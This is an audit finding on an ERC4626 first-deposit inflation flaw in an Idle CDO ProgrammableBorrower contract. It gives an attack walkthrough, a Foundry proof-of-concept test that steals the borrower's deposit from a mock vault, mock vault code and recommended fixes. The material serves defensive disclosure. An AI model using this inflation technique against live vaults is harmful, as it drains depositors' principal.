### Title
Unprotected ERC4626 first-deposit inflation steals programmable-borrower principal - (File: contracts/strategies/idle/ProgrammableBorrower.sol)

### Summary
`ProgrammableBorrower._depositToVault()` deposits pool assets into the configured ERC4626 vault but ignores the number of shares returned. [1](#0-0)  A vault shareholder can inflate the share price before the borrower’s first deposit so the deposit mints zero or dust shares, then redeem their own shares for the borrower’s underlying. [2](#0-1) 

### Finding Description
When `IdleCDOEpochVariant.startEpoch()` sends surplus cash to the programmable borrower, `onStartEpoch()` deposits all on-hand underlying into the external vault. [3](#0-2)  The vault position is valued exclusively through `vault.balanceOf()` and `convertToAssets()`. [2](#0-1) 

An attacker who is an ordinary user of that ERC4626 vault can seed it before the programmable borrower owns shares: deposit `1` wei to receive one share, then donate at least the upcoming pool deposit directly to the vault. When `onStartEpoch()` calls `_depositToVault()`, the pool deposit mints `floor(poolDeposit * 1 / (1 + donation))` shares; with `donation >= poolDeposit`, that is zero. [4](#0-3)  The attacker can then redeem their one share for the donation plus the borrower’s deposit.

The accounting also fails to preserve the loss: `totalInterestDueNow()` clamps vault losses against interest and returns zero rather than reporting impaired principal. [5](#0-4)  On a normal stop with no pending withdrawals, `_amountRequired` is zero, so `onStopEpoch()` never checks whether the vault position can cover the stolen principal and resets the epoch baseline. [6](#0-5)  The CDO therefore continues to value the pool through its unchanged strategy-token balance even though the programmable borrower owns no recoverable vault assets. [7](#0-6) 

### Impact Explanation
For a pool deposit `P`, the attacker’s cost is approximately `P + 1` wei and the redemption returns `2P + 1` wei, giving a direct profit of `P`. The entire programmable-borrower principal can be stolen while CDO accounting still reports it as strategy-token-backed NAV. The insolvency is only discovered when pending withdrawals or pool closure require cash, at which point the CDO enters the default path and losses are socialized among LPs and receipt holders. [8](#0-7) 

### Likelihood Explanation
The attack requires an initialization or `setVault()` window in which the programmable borrower holds no vault shares, because `setVault()` explicitly requires the old position to be unwound. [9](#0-8)  During that window, any vault user who controls enough supply can inflate the vault’s share price before the honest manager starts the next epoch. Existing guards do not prevent it: `_depositToVault()` does not enforce a minimum share output, `onStartEpoch()` snapshots the pre-deposit cash as principal, and the normal stop path can complete without testing recoverability when no withdrawal funds are immediately due. [10](#0-9) 

### Recommendation
Make vault deposits atomic and solvency-checked:

- Record `vault.balanceOf(address(this))` before and after `vault.deposit()` and require `sharesReceived > 0`.
- Require `convertToAssets(sharesReceived)` to be within a small rounding bound of the deposited assets.
- Alternatively use a configured minimum-share/slippage parameter and revert when it is not met.
- Treat an economically empty vault position after a nonzero deposit as a failed start instead of resetting `epochStartVaultAssets` to the deposited principal.
- Add a regression test where an attacker first-deposits `1`, donates `P`, and verifies that the borrower’s `P`-asset deposit reverts rather than minting zero shares.

### Proof of Concept

```solidity
function testERC4626InflationStealsProgrammableDeposit() external {
    MockERC4626Vault inflationVault = new MockERC4626Vault(USDC);

    // Honest owner switches to an ERC4626 whose shares the attacker controls.
    vm.prank(owner);
    programmableBorrower.setVault(address(inflationVault));

    uint256 poolDeposit = 1_000_000 * oneScale;
    uint256 attackerDonation = poolDeposit;
    address attacker = makeAddr("vault-inflator");

    // Classic first-depositor inflation: 1 wei -> 1 share, then inflate assets/share.
    deal(USDC, attacker, attackerDonation + 1);
    vm.startPrank(attacker);
    underlying.approve(address(inflationVault), type(uint256).max);
    inflationVault.deposit(1, attacker);
    underlying.transfer(address(inflationVault), attackerDonation);
    vm.stopPrank();

    // LP deposits normally and the honest manager starts the epoch.
    deal(USDC, address(this), poolDeposit);
    underlying.approve(address(idleCDO), poolDeposit);
    idleCDO.depositAA(poolDeposit);

    vm.prank(manager);
    cdoEpoch.startEpoch();

    // The programmable borrower transferred P underlying but received zero vault shares.
    assertEq(inflationVault.balanceOf(address(programmableBorrower)), 0);
    assertEq(programmableBorrower.totalUnderlying(), 0);

    // The attacker redeems one share for donation + pool deposit + initial wei.
    vm.prank(attacker);
    inflationVault.redeem(1, attacker, attacker);
    assertEq(
        underlying.balanceOf(attacker),
        attackerDonation + poolDeposit + 1
    );

    // With no pending withdrawals, the normal stop still succeeds and reports zero interest
    // instead of realizing that all principal was stolen.
    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0);

    assertFalse(cdoEpoch.defaulted());
    assertEq(cdoEpoch.lastEpochInterest(), 0);
    assertEq(programmableBorrower.totalUnderlying(), 0);
}
```

```text
  function asset() external view returns (address) {
    return address(assetToken);
  }

  function convertToAssets(uint256 shares) public view returns (uint256) {
    uint256 supply = totalSupply();
    if (supply == 0) return shares;
    return shares * assetToken.balanceOf(address(this)) / supply;
  }

  function maxWithdraw(address owner) external view returns (uint256) {
    uint256 assets = convertToAssets(balanceOf(owner));
    return assets < withdrawLimit ? assets : withdrawLimit;
  }

  function setWithdrawLimit(uint256 assets) external {
    withdrawLimit = assets;
  }

  function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
    uint256 assetsBefore = assetToken.balanceOf(address(this));
    uint256 supply = totalSupply();
    shares = supply == 0 || assetsBefore == 0 ? assets : assets * supply / assetsBefore;
    assetToken.transferFrom(msg.sender, address(this), assets);
    _mint(receiver, shares);
  }

  function withdraw(uint256 assets, address receiver, address owner) external returns (uint256 shares) {
    require(assets <= withdrawLimit, "insufficient-liquidity");
    shares = _toSharesRoundUp(assets);
    if (msg.sender != owner) _spendAllowance(owner, msg.sender, shares);
    _burn(owner, shares);
    assetToken.transfer(receiver, assets);
  }

  function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets) {
    assets = convertToAssets(shares);
    require(assets <= withdrawLimit, "insufficient-liquidity");
    if (msg.sender != owner) _spendAllowance(owner, msg.sender, shares);
    _burn(owner, shares);
    assetToken.transfer(receiver, assets);
  }

  function _toSharesRoundUp(uint256 assets) internal view returns (uint256 shares) {
    uint256 supply = totalSupply();
    uint256 managedAssets = assetToken.balanceOf(address(this));
    if (supply == 0 || managedAssets == 0) return assets;
    shares = assets * supply / managedAssets;
    if (shares * managedAssets < assets * supply) shares += 1;
  }
```
